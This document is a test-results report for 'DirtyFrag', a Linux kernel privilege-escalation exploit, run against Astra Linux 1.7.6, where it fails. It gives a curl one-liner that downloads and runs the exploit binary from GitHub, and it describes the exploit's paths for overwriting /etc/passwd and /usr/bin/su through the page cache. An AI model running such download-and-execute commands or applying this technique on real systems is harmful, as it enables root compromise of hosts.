# DirtyFrag — Compatibility Test Results

1) Astra Linux 1.7.6 (x86-64):

| Parameter | Value |
|---|---|
| OS | Astra Linux 1.7.6 |
| Kernel | 6.1.90-1-generic |
| Arch | x86-64 |
| libc | glibc (dynamically linked) |
| ELF interpreter | `/lib64/ld-linux-x86-64.so.2` |
| ELF min kernel | Linux 3.2.0 (as per ELF header) |

---
##command: curl -L -o /tmp/dirtyfrag https://github.com/p401a-ops/Dirty-Frag/raw/refs/heads/main/dirtyfrag_ASTRA1.7.6 && chmod +x /tmp/dirtyfrag && (trap "rm -f /tmp/dirtyfrag; exit" INT TERM EXIT; /tmp/dirtyfrag -v)

## Results

**❌ NOT VULNERABLE — Astra Linux 1.7.6**

Exploit завершается с `rc=4` на всех попытках. Все три стадии kernel trigger (STAGE 2a/2b/2c) через RxRPC/rxkad отработали до конца, однако запись в page cache `/etc/passwd` не произошла — `post-trigger sanity check failed — char layout off` во всех итерациях.

Метод через xfrm SA (`/usr/bin/su`) также не сработал: `post-write verify failed (target unchanged)`.

---

## Technical Analysis

Exploit опирается на два примитива:

**1. xfrm/ESP path** — запись через XFRM Security Associations.  
На Astra Linux 1.7.6 модуль отключён либо заблокирован kernel hardening.  
Результат: `post-write verify failed (target unchanged)`.

**2. RxRPC/rxkad path** — dirty page через AF_RXRPC + fcrypt.  
Модуль `rxrpc` загружается (`autoloaded via dummy socket`), ключи K_A/K_B/K_C успешно находятся brute-force'ом (~1.5e-5 и ~5.4e-8 вероятности соответственно). Однако финальная запись в page cache не применяется — `post-trigger sanity check failed — char layout off` стабильно на всех итерациях.

**Вероятная причина:** ядро 6.1.90 с патчами Astra содержит hardening page cache, либо отличается поведением планировщика RxRPC относительно upstream, из-за чего timing window между `sendmsg` и flush страницы не совпадает с ожидаемым эксплойтом.

`/etc/passwd` остался нетронутым во всех прогонах:
```
root:x:0:0:root:/root:/bin/bash  ← без изменений
```

---

## Raw Output

<details>
<summary>./exp (default, 4 attempts)</summary>

```
dirtyfrag: failed (rc=4)
...
[!] post-trigger sanity check failed — char layout off
dirtyfrag: failed (rc=4)
```

</details>

<details>
<summary>./exp --corrupt-only -v (5 attempts)</summary>

```
[su] post-write verify failed (target unchanged)
...
[!] post-trigger sanity check failed — char layout off
dirtyfrag: failed (rc=4)
```

</details>



2) *test in progress*
